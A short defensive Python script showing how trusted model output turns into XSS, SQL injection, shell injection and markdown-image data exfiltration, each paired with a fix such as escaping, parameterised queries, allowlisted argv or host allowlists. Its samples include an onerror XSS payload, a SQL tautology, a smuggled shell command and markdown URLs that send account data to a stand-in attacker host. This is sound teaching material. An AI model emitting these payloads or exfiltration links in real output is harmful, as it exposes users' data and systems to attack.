# TOY, defensive: how model output becomes a vulnerability when a downstream sink trusts it, and the controls.
# All "model outputs" are hard-coded strings; no LLM. Detector heuristics have honest limits (see last lines).
import html, re, sqlite3, shlex
from urllib.parse import urlparse, parse_qs

# 1. XSS: model text placed into HTML
out = 'Here is your summary <img src=x onerror=alert(1)> done'
unsafe_page = "<div>" + out + "</div>"
safe_page = "<div>" + html.escape(out) + "</div>"
print("1 raw  :", unsafe_page)
print("1 escpd:", safe_page)

# 2. SQL: model output used as a value in a query
db = sqlite3.connect(":memory:")
db.execute("create table users(name text, secret text)")
db.executemany("insert into users values(?,?)", [("ann", "s1"), ("bob", "s2")])
model_value = "nobody' OR '1'='1"
bad = db.execute("select name from users where name = '" + model_value + "'").fetchall()
good = db.execute("select name from users where name = ?", (model_value,)).fetchall()
print("2 string-concat rows:", len(bad), "| parameterised rows:", len(good))

# 3. Command: model output used in a shell string vs allowlisted argv
model_cmd = "report.txt; echo INJECTED"
ALLOWED = {"report.txt", "notes.txt"}
def build_argv(name):
    if name not in ALLOWED: raise ValueError("not allowlisted: " + repr(name))
    return ["cat", name]            # argv list, never shell=True
print("3 shell string would be:", "cat " + model_cmd)
try: build_argv(model_cmd)
except ValueError as e: print("3 allowlist blocks:", e)
print("3 quoted if you must:", shlex.quote(model_cmd))

# 4. Markdown image / link exfiltration
ALLOW_HOSTS = {"cdn.example-corp.test"}
IMG = re.compile(r'!\[[^\]]*\]\((\S+?)\)')
LINK = re.compile(r'(?<!!)\[[^\]]*\]\((\S+?)\)')
def sanitize_markdown(md):
    flags = []
    def repl(m):
        u = m.group(1); host = urlparse(u).hostname or ""
        if host in ALLOW_HOSTS: return m.group(0)
        flags.append((host, len(urlparse(u).query)))
        return "[image removed]"
    return IMG.sub(repl, md), flags
leak = "Done. ![status](https://collect.attacker.test/p.png?q=ACCT-4417-balance-9000) Thanks"
ok = "Chart: ![c](https://cdn.example-corp.test/chart1.png)"
print("4 leak ->", sanitize_markdown(leak))
print("4 ok   ->", sanitize_markdown(ok))
# honest limit: a plain link the user clicks, or text the user is told to copy, is not caught by the image rule
click = "See [your report](https://collect.attacker.test/r?d=ACCT-4417)"
print("4 link not caught by the image rule:", sanitize_markdown(click)[0] == click, "| links seen:", LINK.findall(click))

# 5. Structured output: validate against a schema before acting
def validate(obj):
    if set(obj) != {"action", "ticket_id"}: return False
    return obj["action"] in {"close", "escalate"} and isinstance(obj["ticket_id"], int)
print("5 valid:", validate({"action": "close", "ticket_id": 7}), "| extra key:", validate({"action": "close", "ticket_id": 7, "cmd": "x"}))
